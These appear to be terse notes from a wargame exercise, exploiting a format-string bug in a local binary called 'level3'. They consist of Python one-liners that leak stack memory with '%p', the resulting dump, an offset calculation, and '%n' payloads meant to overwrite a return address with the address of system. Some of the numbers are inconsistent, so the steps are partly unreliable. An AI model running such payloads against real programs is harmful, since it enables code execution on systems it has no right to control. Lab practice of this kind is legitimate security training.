
    (python -c 'print "zzzz" + " %p" * 200'; cat) | ./level3 
     zzzz 
   00 0x200      0xb7fd1ac0 0xb7ff37d0 0x7a7a7a7a
   01 0x20702520 0x25207025 0x70252070 0x20702520
   02 0x25207025 0x70252070 0x20702520 0x25207025
   03 0x70252070 0x20702520 0x25207025 0x70252070
   04 0x20702520 0x25207025 0x70252070 0x20702520
   05 0x25207025 0x70252070 0x20702520 0x25207025
   06 0x70252070 0x20702520 0x25207025 0x70252070
   07 0x20702520 0x25207025 0x70252070 0x20702520
   08 0x25207025 0x70252070 0x20702520 0x25207025
   09 0x70252070 0x20702520 0x25207025 0x70252070
   10 0x20702520 0x25207025 0x70252070 0x20702520
   11 0x25207025 0x70252070 0x20702520 0x25207025
   12 0x70252070 0x20702520 0x25207025 0x70252070
   13 0x20702520 0x25207025 0x70252070 0x20702520
   14 0x25207025 0x70252070 0x20702520 0x25207025
   15 0x70252070 0x20702520 0x25207025 0x70252070
   16 0x20702520 0x25207025 0x70252070 0x20702520
   17 0x25207025 0x70252070 0x20702520 0x25207025
   18 0x70252070 0x20702520 0x25207025 0x70252070
   19 0x20702520 0x25207025 0x70252070 0x20702520
   20 0x25207025 0x70252070 0x20702520 0x25207025
   21 0x70252070 0x20702520 0x25207025 0x70252070
   22 0x20702520 0x25207025 0x70252070 0x20702520
   23 0x25207025 0x70252070 0x20702520 0x25207025
   24 0x70252070 0x20702520 0x25207025 0x70252070
   25 0x20702520 0x25207025 0x70252070 0x20702520
   26 0x25207025 0x70252070 0x20702520 0x25207025
   27 0x70252070 0x20702520 0x25207025 0x70252070
   28 0x20702520 0x25207025 0x70252070 0x20702520
   29 0x25207025 0x70252070 0x20702520 0x25207025
   30 0x70252070 0x20702520 0x25207025 0x70252070
   31 0x20702520 0x25207025 0x70252070 0x20702520
   32 0x25207025 0x70252070 0x702520   0xb7fed280
   33 (nil)      0xbffff768 0x8048525

   row * 4 + col = 33 * 4 + 3 = 135

    (python -c 'print "zaza" + "%210043908c" + "%135$n"'; cat) | ./level3 
    (python -c 'print "A" * 134513932 + "%135$n"'; cat) | ./level3 
    
    0x0804850c - add system -  134513932 or 210043912
    0x8048525 - ret addr 